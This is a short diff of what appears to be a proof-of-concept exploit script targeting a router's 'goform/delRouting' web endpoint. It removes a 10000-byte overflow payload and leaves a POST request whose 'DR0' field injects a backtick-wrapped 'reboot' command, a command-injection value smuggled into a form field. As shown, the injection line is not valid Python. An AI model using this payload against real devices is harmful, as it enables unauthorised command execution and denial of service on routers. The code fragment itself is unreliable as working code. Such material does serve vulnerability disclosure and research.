@@ -42,14 +42,10 @@ tokenid = ''
 
 url = 'http://192.168.0.1/goform/delRouting'
 
-payload = b'a' * 10000
-
 data = {
     'tokenid': tokenid,
     'DR0': a`reboot` b c
 }
 
-print('payload sending...')
 r = requests.post(url, data)
-print('end')
 ```
